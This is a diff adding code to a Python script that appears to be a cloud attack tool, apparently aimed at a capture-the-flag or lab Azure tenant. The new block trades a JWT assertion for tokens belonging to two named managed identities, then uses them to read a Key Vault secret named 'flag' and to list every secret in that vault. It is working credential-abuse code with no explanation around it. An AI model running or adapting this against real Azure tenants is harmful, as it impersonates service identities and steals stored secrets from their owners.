@@ -70,6 +70,26 @@ def aad(scope):
     show('Azure token error '+scope,result)
     return None
 
+for label, app_id in (
+    ('reporting-managed-identity', '7a85156a-01c4-4e61-8472-40a92107159b'),
+    ('storefront-managed-identity', 'b9658576-853f-49bd-b278-d4bd014397c4'),
+):
+    assertion=urllib.parse.urlencode({
+        'client_id':app_id, 'scope':'https://vault.azure.net/.default',
+        'grant_type':'client_credentials',
+        'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+        'client_assertion':jwt}).encode()
+    exchange=call('https://login.microsoftonline.com/'+tenant+'/oauth2/v2.0/token',
+                  method='POST',data=assertion)
+    exchange_body=exchange.get('body',{})
+    identity_token=exchange_body.get('access_token') if isinstance(exchange_body,dict) else None
+    if identity_token:
+        show(label+' sec flag',call('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4',identity_token))
+        show(label+' sec list',call('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4',identity_token))
+    else:
+        print('MANAGED_IDENTITY_OIDC',label,exchange.get('status'),
+              exchange_body.get('error') if isinstance(exchange_body,dict) else '',flush=True)
+
 arm_token=aad('https://management.azure.com/.default')
 vault_token=aad('https://vault.azure.net/.default')
 
